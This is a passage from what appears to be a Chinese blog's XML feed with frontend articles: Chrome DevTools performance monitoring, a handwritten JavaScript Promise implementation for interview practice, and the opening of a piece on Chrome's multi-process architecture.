中，该部分是最需要关注的指标之一。</li><li>NET：主要展示了网络请求的先后顺序以及各自的请求耗时，可以被 Network 面板完美替代，建议直接查看 Network。</li></ol><p>接下来，我们来了解一下最杂乱的中间部分，一般情况下，我们主要根据中间部分中 Main 的图表来分析页面性能。</p><p>由于 Main 的图表长得像一团团倒立的火焰，所以，我们将其称为火焰图。它展现了主线程在 Record 过程中做的所有事情，包括：Loading、Scripting、Rendering、Painting 等等。火焰图的横轴代表着时间，纵轴代表着调用堆栈。每一个长条代表执行了一个事件或函数，长条的长度代表着耗时的长短，如果某个长条右上角是红色的则表示该函数存在性能问题，需要重点关注。</p><p>活用 Performance，按照 Chrome 的提示进行优化，可以解决掉绝大部分的性能问题。</p><p><a name="23ab71fd"></a></p><h3 id="Performance-monitor"><a href="#Performance-monitor" class="headerlink" title="Performance monitor"></a>Performance monitor</h3><p>看起来，Performance 提供的性能监测功能已经较为完备，但是，它有两个问题：</p><ol><li>数据缺少实时性</li><li>数据面板过于复杂，不够直观</li></ol><p>为了解决这两个问题，Chrome 提供了 Performance monitor 功能，以实时直观的数据展示页面性能。</p><p>相比 Performance ，Performance monitor 所在的位置较为隐蔽，需要以下几个步骤才能打开：</p><ol><li>打开 Chrome 开发者工具</li><li>按“Esc”，打开附加面板</li><li>点击选项按钮，打开选项菜单</li><li>选择“Performance monitor”</li></ol><p>由于 Performance monitor 是实时的，所以，进入面板后，Performance monitor 将会自动运行，记录页面性能数据，通过点击左侧的选项，可以调整记录的数据类型。</p><p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237407434-b08210b3-5a80-4a2d-ac10-4db029112cec.jpeg" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237407434-b08210b3-5a80-4a2d-ac10-4db029112cec.jpeg" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="performance moniitor.jpg"></p><p>相比 Performance，Performance monitor 的功能虽然不够全面，但胜在简洁、实时。通常情况下，可以通过 Performance monitor 来分析页面使用过程中的性能问题，例如：动画性能等。</p><p><a name="Audits"></a></p><h3 id="Audits"><a href="#Audits" class="headerlink" title="Audits"></a>Audits</h3><p>虽然 Performance 以及 Performance monitor 提供了大量性能数据，但是，如果开发者经验不足，复杂的性能数据无异于天书。那么，Chrome 能不能自动分析出页面的性能缺陷，给出具体的性能优化点呢？万幸，Chrome 提供了 Audits。</p><p>Audits 源于著名的开源自动化分析插件——Lighthouse，Lighthouse 不仅能够分析页面性能，还能够对 PWA、无障碍访问、SEO 等进行测试评分，并给出优化建议。为了方便开发者使用，在 Chrome 60 版本，Chrome 开发团队直接将其加入 Chrome 开发者工具中的 Audits 面板中。</p><p>Lighthouse 转正之后，使用该功能不需要安装额外的 Chrome 插件，只需要进入 Audits 面板，点击 Run audits 按钮即可生成一份页面分析报告，如下所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237418556-4b5dc443-fe24-46a3-a951-7192ce573da6.jpeg" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237418556-4b5dc443-fe24-46a3-a951-7192ce573da6.jpeg" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="audits.jpg"></p><p>通过结果可以看到，Audits 不仅能够自动分析出页面的缺陷，还能根据缺陷给出具体的优化建议。这就意味着，使用了 Audits 之后，我们只需要按照 Audits 给出的优化建议逐条尝试，即可大幅度提高页面性能，实乃前端偷懒神器~</p><p><a name="c1163678"></a></p><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>之前我们一直说的是基于 Chrome 浏览器的性能监测方案，但是，其实还有一种不基于浏览器的性能监测方案：编程式性能监测。</p><p>编程式性能监测主要依托于 W3C 推出的 Performance API，该套 API 的目的是简化开发者对网站性能进行精确分析与控制的过程，方便开发者采取手段提高 web 性能。</p><p>相比之前的性能监测方法，Performance API 最大的优点是：灵活、精确，所以一经推出便风靡全球。比如，Vue 中便封装了 Performance API 方便开发者进行性能追踪。</p><p>由于篇幅有限，在此不再赘述，有兴趣的同学可以自行了解。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>性能监测是前端性能优化的第一步，只有学会了性能监测，我们才能更好地剖析性能问题，直至彻底解决性能问题。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
            <tag> 性能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise A+ 规范</title>
      <link href="/2021/03/17/frontend/interview/promise-a-gui-fan/"/>
      <url>/2021/03/17/frontend/interview/promise-a-gui-fan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>Promise 对象用于表示一个异步操作的最终完成（或失败）及其结果值。<br><a name="Arniy"></a></p><h1 id="Promise-A-规范"><a href="#Promise-A-规范" class="headerlink" title="Promise A+ 规范"></a>Promise A+ 规范</h1><p><a href="http://malcolmyu.github.io/malnote/2015/06/12/Promises-A-Plus/">Promise A+ 规范</a><br><a name="Kgt2P"></a></p><h1 id="手写Promise"><a href="#手写Promise" class="headerlink" title="手写Promise"></a>手写Promise</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PENDING</span> = <span class="string">&#x27;pending&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">RESOLVED</span> = <span class="string">&#x27;resolved&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">REJECTED</span> = <span class="string">&#x27;rejected&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">asyncFun</span> = (<span class="params">fn</span>) =&gt; &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Promise_</span> &#123;</span><br><span class="line">    </span><br><span class="line">    status;</span><br><span class="line">    resolver;</span><br><span class="line">    rejecter;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">executor, options</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">PENDING</span>;</span><br><span class="line">        <span class="title function_">executor</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">RESOLVED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">resolver</span>?.(res);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="variable constant_">REJECTED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">rejecter</span>?.(err);</span><br><span class="line">                <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="title class_">Error</span>(err);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">then</span>(<span class="params">resolver, rejecter</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">resolver</span> = resolver;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">rejecter</span> = rejecter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">reject</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="title class_">Promise</span>_) <span class="keyword">return</span> value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(value);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">all</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> resArr = [];</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = (<span class="params">res, index</span>) =&gt; &#123;</span><br><span class="line">                resArr[index] = res;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="keyword">if</span>(count === promisers.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(resArr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = (<span class="params">err</span>) =&gt; &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err)</span><br><span class="line">            &#125;;</span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function">(<span class="params">promiser, index</span>) =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    <span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">resolver</span>(res, index),</span><br><span class="line">                    <span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">rejecter</span>(err)</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">race</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = res =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(!flag) &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="title function_">resolve</span>(res);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = err =&gt; &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function"><span class="params">promiser</span> =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    resolver,</span><br><span class="line">                    rejecter</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">any</span>(<span class="params">promisers</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> stopReject = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">resolver</span> = res =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(!stopReject) &#123;</span><br><span class="line">                    stopReject = <span class="literal">true</span>;</span><br><span class="line">                    <span class="title function_">resolve</span>(res);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> errs = [];</span><br><span class="line">            <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="title function_">rejecter</span> = err =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span>(stopReject) <span class="keyword">return</span>;</span><br><span class="line">                count++;</span><br><span class="line">                errs.<span class="title function_">push</span>(err);</span><br><span class="line">                <span class="keyword">if</span>(count === promisers.<span class="property">length</span>) &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(errs);</span><br><span class="line">                    <span class="title function_">asyncFun</span>(<span class="function">() =&gt;</span> &#123; </span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AggregateError</span>(errs)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            promisers.<span class="title function_">map</span>(<span class="function"><span class="params">promiser</span> =&gt;</span> &#123;</span><br><span class="line">                promiser.<span class="title function_">then</span>(</span><br><span class="line">                    resolver,</span><br><span class="line">                    rejecter</span><br><span class="line">                );</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误1&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">100</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">2</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误2&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">50</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise3 = <span class="keyword">new</span> <span class="title class_">Promise</span>_(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="number">3</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;发生错误3&#x27;)</span></span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>_.<span class="title function_">race</span>([promise1, promise2, promise3]).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise4 = <span class="title class_">Promise</span>_.<span class="title function_">resolve</span>(promise3);</span><br><span class="line">promise4.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise5 = <span class="title class_">Promise</span>_.<span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;fail&#x27;</span>));</span><br><span class="line"></span><br><span class="line">promise5.<span class="title function_">then</span>(</span><br><span class="line">    <span class="function">() =&gt;</span> &#123;&#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> es6 </tag>
            
            <tag> Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代浏览器内部揭秘</title>
      <link href="/2021/03/16/frontend/browser/xian-dai-liu-lan-qi-nei-bu-jie-mi/"/>
      <url>/2021/03/16/frontend/browser/xian-dai-liu-lan-qi-nei-bu-jie-mi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="f3a2f325"></a></p><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p>从高级视角对浏览器架构与多进程架构的优点进行阐述。我们也对 Chrome 中与多进程架构密切相关的服务化与站点隔离进行了讲解。<br><a name="5c888d03"></a></p><h2 id="CPU、GPU、内存和多进程体系结构"><a href="#CPU、GPU、内存和多进程体系结构" class="headerlink" title="CPU、GPU、内存和多进程体系结构"></a>CPU、GPU、内存和多进程体系结构</h2><p>这一博客系列由四部分组成，将从高级体系结构到渲染流程的细节来窥探 Chrome 浏览器的内部。如果你曾对浏览器是如何将代码转化为具有功能的网站，或者你并不确定为何建议使用某一技术来提升性能，那么本系列就是为你准备的。</p><p>本文作为此系列的第一部分，将介绍核心计算术语与 Chrome 的多进程体系架构。</p><p><strong>提示：</strong> 如果你已熟悉 CPU&#x2F;GPU，进程&#x2F;线程的相关概念，可以直接跳到<a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84">浏览器架构</a>部分开始阅读。</p><p><a name="b70385d9"></a></p><h2 id="计算机的核心是-CPU-与-GPU"><a href="#计算机的核心是-CPU-与-GPU" class="headerlink" title="计算机的核心是 CPU 与 GPU"></a>计算机的核心是 CPU 与 GPU</h2><p>为了了解浏览器运行的环境，我们需要了解几个计算机部件以及它们的作用。</p><p><a name="CPU"></a></p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615206916-bd6e36d0-2361-45d1-8003-41e113c8a57f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615206916-bd6e36d0-2361-45d1-8003-41e113c8a57f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 1：4 个 CPU 核心作为办公人员，坐在办公桌前处理各自的工作</p><p>第一个需要了解的计算机部件是 <strong>中央处理器（Central Processing Unit）</strong>，或简称为 <strong>CPU</strong>。CPU 可以看作是计算机的大脑。一个 CPU 核心如图中的办公人员，可以逐一解决很多不同任务。它可以在解决从数学到艺术一切任务的同时还知道如何响应客户要求。过去 CPU 大多是单芯片的，一个核心就像存在于同芯片的另一个 CPU。随着现代硬件发展，你经常会有不止一个内核，为你的手机和笔记本电脑提供更多的计算能力。</p><p><a name="GPU"></a></p><h3 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615214916-e56c86c5-73d2-435b-a15d-a4d054a497e9.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615214916-e56c86c5-73d2-435b-a15d-a4d054a497e9.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 2：许多带特定扳手的 GPU 内核意味着它们只能处理有限任务</p><p><strong>图形处理器</strong>（<strong>Graphics Processing Unit</strong>，简称为 <strong>GPU</strong>）是计算机的另一部件。与 CPU 不同，GPU 擅长同时处理跨内核的简单任务。顾名思义，它最初是为解决图形而开发的。这就是为什么在图形环境中“使用 GPU” 或 “GPU 支持”都与快速渲染和顺滑交互有关。近年来随着 GPU 加速计算的普及，仅靠 GPU 一己之力也使得越来越多的计算成为可能。</p><p>当你在电脑或手机上启动应用时，是 CPU 和 GPU 为应用供能。通常情况下应用是通过操作系统提供的机制在 CPU 和 GPU 上运行。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615221906-3c30dd92-c25a-4932-988d-b43103afd2f4.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615221906-3c30dd92-c25a-4932-988d-b43103afd2f4.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 3：三层计算机体系结构。底部是机器硬件，中间是操作系统，顶部是应用程序。</p><p><a name="0db1a238"></a></p><h2 id="在进程和线程上执行程序"><a href="#在进程和线程上执行程序" class="headerlink" title="在进程和线程上执行程序"></a>在进程和线程上执行程序</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615229734-f013746e-2986-422f-a34c-14e878197431.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615229734-f013746e-2986-422f-a34c-14e878197431.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图四：进程作为边界框，线程作为抽象鱼在进程中游动</p><p>在深入学习浏览器架构之前需要了解的另一个理论是进程与线程。进程可以被描述为是一个应用的执行程序。线程存在于进程并执行程序任意部分。</p><p>启动应用时会创建一个进程。程序也许会创建一个或多个线程来帮助它工作，这是可选的。操作系统为进程提供了一个可以使用的“一块”内存，所有应用程序状态都保存在该私有内存空间中。关闭应用程序时，相应的进程也会消失，操作系统会释放内存。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615438699-00069387-aaa0-4594-95fd-1875d9d4b287.svg#height=469&id=fyFkB&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252656&status=done&style=none&title=&width=853" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615438699-00069387-aaa0-4594-95fd-1875d9d4b287.svg#height=469&id=fyFkB&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252656&status=done&style=none&title=&width=853" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="1..svg"></p><p>图 5 ：进程使用内存空间和存储应用数据的示意图</p><p>进程可以请求操作系统启动另一个进程来执行不同的任务。此时，内存中的不同部分会分给新进程。如果两个进程需要对话，他们可以通过<strong>进程间通信</strong>（<strong>IPC</strong>）来进行。许多应用都是这样设计的，所以如果一个工作进程失去响应，该进程就可以在不停止应用程序不同部分的其他进程运行的情况下重新启动。<br /><img src="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615773729-459bc3e3-9d03-4af9-a5d0-5a11276a034f.svg#height=470&id=caSEM&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293505&status=done&style=none&title=&width=855" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/svg/164572/1599615773729-459bc3e3-9d03-4af9-a5d0-5a11276a034f.svg#height=470&id=caSEM&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293505&status=done&style=none&title=&width=855" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="2.svg"></p><p>图 6：独立进程通过 IPC 通信示意图</p><p><a name="c4f5cabc"></a></p><h2 id="浏览器架构"><a href="#浏览器架构" class="headerlink" title="浏览器架构"></a>浏览器架构</h2><p>那么如何通过进程和线程构建 web 浏览器呢？它可能由一个拥有很多线程的进程，或是一些通过 IPC 通信的不同线程的进程。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615781904-137d5260-8f05-4773-9a44-1e650ac38709.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599615781904-137d5260-8f05-4773-9a44-1e650ac38709.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 7：不同浏览器架构的进程&#x2F;线程示意图</p><p>这里需要注意的重要一点是，这些不同的架构是实现细节。关于如何构建 web 浏览器并不存在标准规范。一个浏览器的构建方法可能与另一个迥然不同。</p><p>在本博客系列中，我们使用下图所示的 Chrome 近期架构进行阐述。</p><p>顶部是浏览器进程，它与处理应用其它模块任务的进程进行协调。对于渲染进程来说，创建了多个渲染进程并分配给了每个标签页。直到最近，Chrome 在可能的情况下给每个标签页分配一个进程。而现在它试图给每个站点分配一个进程，包括 iframe（参见<a href="#%E6%AF%8F%E4%B8%AA-iframe-%E7%9A%84%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B--%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB">站点隔离</a>）。</p><p><img 